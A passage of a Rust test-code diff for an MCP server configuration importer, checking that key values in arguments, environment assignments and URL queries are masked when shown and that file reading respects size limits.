-                .unwrap_or_else(std::sync::PoisonError::into_inner)
-                .recv();
-            true
-        });
-        let disk = OnDisk::with_stat(None, std::time::Duration::ZERO, stat);
-        let (done, read) = mpsc::channel();
-        let reading = std::thread::spawn(move || {
-            let servers = servers_at(text, false, &disk);
-            let _ = done.send((servers, disk.asked.get()));
-        });
-        // Waited for only when the reading itself waits for the disk, as a
-        // break of the limit makes it: then the gate opens, and it ends.
-        let read = read.recv_timeout(std::time::Duration::from_secs(5));
-        drop(gate);
-        reading.join().unwrap();
-        let (servers, asked) =
-            read.expect("the reading does not wait for a disk that does not answer");
-        assert_eq!(servers.unwrap()[0].refused, Some(Refusal::NamedValue));
-        assert_eq!(asked, 1, "nothing more is asked once a path did not answer");
-        // A disk that answers at once, with room to: a place.
-        let disk = OnDisk::with_stat(
-            None,
-            std::time::Duration::from_secs(60),
-            Arc::new(|_: &Path| true),
-        );
-        let servers = servers_at(text, false, &disk).unwrap();
-        assert_eq!(servers[0].refused, None);
-        assert_eq!(servers[0].shown(), "x-mcp --key /etc/k --ssh-key /etc/s");
+    fn a_value_is_judged_by_its_text_and_never_asked_of_the_disk() {
+        let scratch = cineris_testkit::Scratch::outside("cineris-config-unit", "import_no_disk");
+        // Written with `/`, which Windows takes as a separator too, so that
+        // the path is a token on both systems: a `\` would refuse.
+        let written = |path: std::path::PathBuf| path.to_str().unwrap().replace('\\', "/");
+        let file = written(scratch.file("keys/client.key", "not read"));
+        let dir = written(scratch.dir("keys/store"));
+        let gone_file = written(scratch.join("keys/missing.key"));
+        let gone_dir = written(scratch.join("keys/missing"));
+        for path in [&file, &dir, &gone_file, &gone_dir] {
+            assert!(
+                token_shaped(path, false),
+                "the scratch folder's path is a token: {path}"
+            );
+        }
+        // Each server's row, by its name: what is shown, whether it hides a
+        // value, and why it is refused.
+        type Rows = std::collections::BTreeMap<String, (String, bool, Option<Refusal>)>;
+        let judged = |value: &str| -> Rows {
+            let text = serde_json::json!({"mcpServers": {
+                "flag": {"command": "tls-mcp", "args": ["--key", value]},
+                "joined": {"command": "tls-mcp", "args": [format!("--key={value}")]},
+                "named": {"command": "env", "args": [format!("KEY={value}"), "tls-mcp"]},
+                "address": {"url": format!("https://x.example.com/mcp?api_key={value}")}
+            }})
+            .to_string();
+            servers_in(&text, false)
+                .unwrap()
+                .into_iter()
+                .map(|server| {
+                    let row = (server.shown(), server.hidden(), server.refused);
+                    (server.name, row)
+                })
+                .collect()
+        };
+        let expected: Rows = [
+            ("flag", format!("tls-mcp --key {MASK}")),
+            ("joined", format!("tls-mcp --key={MASK}")),
+            ("named", format!("env KEY={MASK} tls-mcp")),
+            (
+                "address",
+                format!("https://x.example.com/mcp?api_key={MASK}"),
+            ),
+        ]
+        .into_iter()
+        .map(|(name, shown)| (name.to_owned(), (shown, true, None)))
+        .collect();
+        for (there, gone) in [(&file, &gone_file), (&dir, &gone_dir)] {
+            assert_eq!(judged(there), expected, "{there}, which exists");
+            assert_eq!(judged(gone), expected, "{gone}, which does not");
+        }
     }
 
     /// A `;` separates fields only where a field follows it: one inside a
@@ -1675,12 +1384,12 @@ mod tests {
         let path = scratch.file("mcp.json", &text);
         let size = text.len() as u64;
         assert_eq!(
-            read_servers_within(&path, size, &NOWHERE).unwrap().len(),
+            read_servers_within(&path, size).unwrap().len(),
             MAX_SERVERS,
             "a file of the size read is read"
         );
         assert_eq!(
-            read_servers_within(&path, size - 1, &NOWHERE),
+            read_servers_within(&path, size - 1),
             Err(ImportError::TooLarge)
         );
     }
@@ -1689,9 +1398,9 @@ mod tests {
     fn a_file_is_read_whole_or_not_at_all() {
         let scratch = cineris_testkit::Scratch::outside("cineris-config-unit", "import");
         let path = scratch.file("mcp.json", CLAUDE);
-        assert_eq!(read_servers(&path, &NOWHERE).unwrap().len(), 6);
+        assert_eq!(read_servers(&path).unwrap().len(), 6);
         assert!(matches!(
-            read_servers(&scratch.join("missing.json"), &NOWHERE),
+            read_servers(&scratch.join("missing.json")),
             Err(ImportError::Unreadable(_))
         ));
     }
